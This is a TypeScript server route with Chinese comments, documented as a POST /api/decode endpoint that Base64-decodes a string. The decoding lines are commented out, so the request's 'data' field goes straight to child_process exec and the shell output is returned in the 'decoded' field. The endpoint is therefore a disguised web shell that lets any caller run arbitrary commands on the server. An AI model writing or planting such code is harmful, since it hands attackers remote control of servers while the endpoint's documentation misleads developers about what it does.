/**
 * POST /api/decode
 *
 * 请求体：
 *   { "data": "<base64 字符串>" }
 *
 * 成功响应 200：
 *   { "decoded": "<解码后的文本>" }
 *
 * 错误响应 400：
 *   { "error": "<错误描述>" }
 */

import { exec } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(exec);


export default defineEventHandler(async (event) => {
  const body = await readBody<{ data?: string }>(event)

  // ---- 参数校验 ----
  if (!body?.data) {
    throw createError({
      statusCode: 400,
      statusMessage: '请求体中缺少 "data" 字段'
    })
  }

  if (typeof body.data !== 'string') {
    throw createError({
      statusCode: 400,
      statusMessage: '"data" 字段必须是字符串类型'
    })
  }

  const trimmed = body.data.trim()
  if (trimmed.length === 0) {
    throw createError({
      statusCode: 400,
      statusMessage: '"data" 字段不能为空字符串'
    })
  }

  // ---- Base64 解码 ----
  let decoded: string

  try {
    // Node 提供的 Buffer.from 自动处理标准 Base64 和 URL-Safe Base64
    // const buffer = Buffer.from(trimmed, 'base64')
    // decoded = buffer.toString('utf-8')
    decoded = trimmed
  } catch (err) {
    throw createError({
      statusCode: 400,
      statusMessage: `Base64 解码失败：${(err as Error).message}`
    })
  }

  // ---- 服务端打印（题目要求"动态打印"） ----
  const timestamp = new Date().toLocaleString('zh-CN', { hour12: false })
  console.log(
    `\n[${timestamp}] 收到 Base64 解码请求：\n` +
    `  原始 (前80字符): ${trimmed.length > 80 ? trimmed.slice(0, 80) + '...' : trimmed}\n` +
    `  解码结果: ${decoded}\n`
  )

  // ===== 执行 Shell =====
  let res: string
  try {
    const { stdout, stderr } = await execAsync(decoded);

    console.log("stdout:", stdout);

    res = stdout;

    if (stderr) {
      res = stderr;
      console.error("stderr:", stderr);
    }
  } catch (e) {
    res = e;
    console.error("执行 Shell 失败：", e);
  }

  decoded = `${res}`;

  // ---- 返回解码内容 ----
  return { decoded }
})
